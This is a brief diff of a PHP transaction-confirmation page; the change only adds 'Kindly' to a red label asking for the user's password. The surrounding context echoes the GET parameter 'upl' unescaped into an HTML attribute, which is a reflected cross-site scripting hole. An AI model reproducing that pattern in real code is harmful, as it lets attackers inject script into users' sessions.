@@ -81,7 +81,7 @@ $upl     = $_GET['upl'];
                            <input type="text" id="upl" value="<?php echo $upl ?>" hidden>
                    <div class="col-sm-12">
                     <div class="form-group">
-                        <label><b style="color: #ff0000; font-size: 18px;">Input your password to confirm this transaction.:</b></label><br><br><br>
+                        <label><b style="color: #ff0000; font-size: 18px;">Kindly Input your password to confirm this transaction.:</b></label><br><br><br>
                         <input class="form-control valid" name="password" id="trpword" type="password" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter your Password'" placeholder="Enter your Password" required>
                     </div>
                     <div id="msg"></div><br>
